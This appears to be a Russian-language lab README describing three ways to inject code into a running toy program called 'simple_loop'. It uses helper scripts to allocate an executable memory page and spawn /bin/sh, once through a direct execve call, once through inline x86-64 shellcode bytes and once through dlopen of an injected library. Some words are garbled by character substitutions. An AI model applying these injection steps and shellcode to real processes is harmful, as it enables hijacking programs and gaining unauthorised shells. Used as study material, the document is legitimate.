# Алгоритмы 

## Алгоритм 1
* Подключиться к процессу запущенной программы `simple_loop`
* Выделить память на `чтение/запись/исполнение`
```bash
$ ./alloc_pages.py -p $(pgrep simple_loop) -n 1 -d '/bin/sh'

# Output:
# attached
# successful trap
# rwx page has address 0x7fde5e171000L
```
* Записать строку, содержащую путь до `shell`-интерпретатора, в выделенную память
```bash
$ ./call_execve.py -p $(pgrep simple_loop) -a $(printf "%d" 0x7fde5e171000)

# Output:
# attached
# successful trap
```
* Подготовить регистры для вызова системной функции `execve` 
* Выполнить прерывание 

## Алгоритм 2
* Подключиться к процессу запущенной программы `simple_loop`
* Выделить память на `чтение/запись/исполнение`
```bash
$ ./alloc_pages.py -p $(pgrep simple_loop) -n 1 
-d $(echo -e \
'\x48\x31\xd2\x48\x31\xf6\x48' \
'\x31\xc0\x48\xb9\x2f\x2f\x62' \
'\x69\x6e\x2f\x73\x68\x50\x51' \
'\xb0\x3b\x48\x89\xe7\x0f\x05')

# Output:
# attached
# successful trap
# rwx page has address 0x7f1965eba000L
```  
* Записать строку, содержащую команды по подготовке регистров и вызову системной функции ехесуе, в выделенную память 
```bash
$ ./call_execve_via_addr.py \
-p $(pgrep simple_loop) \
-a $(printf "%d" 0x7f1965eba000)

# Output:
# attached
# successful trap
```
* Установить значение регистра `rax` равным адресу памяти
* Выполнить переход по указанному адресу (`call rax` или `jmp rax`)
## Алгоритм 3
* Подключиться к процессу запущенной программы `simple_loop`
* Выделить память на `чтение/запись/исполнение`
```bash
$ ./alloc_pages.py -p \
$(pgrep simple_loop_dl) -n 1 \
-d './execve_sh_dl.so'

# Output:
# attached
# successful trap
# rwx page has address 0x7f1038b0f000L
```
* Записать строку, содержащую путь до инъектируемой во-библиотеки, в выделенную память
```bash
$ ./call_execve_via_dl.py \
-p $(pgrep simple_loop_dl) \
-a $(printf "%d" 0x7f1038b0f000)

# Output:
# attached
# successful trap
```
* Установить значение регистра гах равным адресу функции `dlopen`
* Выполнить переход по указанному адресу (`call rax` или `jmp rax`)
  
> Ограничение: программа `simple_loop` должна быть собрана с поддержкой библиотеки `libdl.so` 
> 
> (`simple_loop`  `simple_loop_dl`) 

